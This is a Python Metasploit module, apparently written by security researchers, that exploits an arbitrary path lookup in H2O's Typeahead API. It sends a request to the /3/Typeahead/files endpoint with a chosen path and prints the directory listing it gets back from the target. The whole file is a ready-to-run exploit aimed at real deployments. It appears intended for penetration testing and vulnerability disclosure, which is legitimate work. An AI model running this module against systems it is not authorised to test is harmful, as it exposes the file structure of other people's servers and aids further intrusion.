#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import requests
    from requests import Request, Session
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'H2O arbitrary path lookup',
    'description': '''
        H2O allows for arbitrary path lookup via it's Typehead API endpoint
    ''',
    'authors': [
        'byt3bl33d3r <marcello@protectai.com>',
        'danmcinerney <dan@protectai.com>'
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc'},
        #{'type': 'cve', 'ref': ''}
    ],
    'type': 'single_scanner',
    'options': {
        'path': {'type': 'string', 'description': 'Filepath to list directory contents', 'required': True, 'default': '.'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 54321},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    try:
        base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"

        r = requests.get(f"{base_url}/3/Typeahead/files", params={"src": args['path'], "limit": 10})
        r.raise_for_status()

    except requests.exceptions.RequestException as e:
        logging.error(str(e))
        return


    logging.info(f"Directory Contents: \n{chr(10).join(r.json()['matches']) }")

if __name__ == '__main__':
    module.run(metadata, run)
